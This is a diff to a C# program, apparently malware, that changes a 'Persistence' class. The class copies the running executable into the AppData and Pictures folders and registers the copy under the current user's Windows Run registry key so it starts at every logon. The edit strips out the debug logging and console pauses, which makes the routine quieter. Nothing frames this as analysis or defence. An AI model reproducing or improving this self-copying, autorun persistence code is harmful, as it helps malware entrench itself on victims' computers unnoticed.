@@ -31,19 +31,12 @@ namespace Tanuki_the_first
 
     class Persistence
     {
-        private string[] path_copies = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
-                                                        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };
-
-        public void WriteLog(string msg)
-        {
-            Console.WriteLine(msg);
-        }
+        private string[] path_copies = new string[] { Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) };
 
         public void SelfCopy()
         {
             string currentCopy = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-            this.WriteLog("Current copy: " + currentCopy);
-            this.WriteLog("CWD: " + Directory.GetCurrentDirectory());
             
             if (currentCopy == null) { return; }
 
@@ -59,9 +52,6 @@ namespace Tanuki_the_first
                         try
                         {
                             File.Copy(currentCopy, copy, true);
-
-                            this.WriteLog("Copied successfully from: " + currentCopy);
-                            this.WriteLog("Copied successfully to: " + copy);
                             
                             try
                             {
@@ -75,8 +65,7 @@ namespace Tanuki_the_first
                         }
                         catch (Exception ex)
                         {
-                            this.WriteLog("Failed to copy: " + ex.Message);
-                            Console.ReadLine();
+                            Console.WriteLine("Failed to copy: " + ex.Message);
                         }
                     }
                     this.ReachPersistence(copy);
@@ -95,15 +84,11 @@ namespace Tanuki_the_first
                 RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 registryKey.SetValue(keyName, value);
 
-                this.WriteLog(registryKey.GetValue(keyName).ToString());
                 registryKey.Close();
-
-                this.WriteLog("Persistence reached!!!");
             }
             catch (Exception ex)
             {
-                this.WriteLog("Could not add program to registry: " + ex.Message);
-                Console.ReadLine();
+                Console.WriteLine("Could not add program to registry: " + ex.Message);
             }
         }
     }
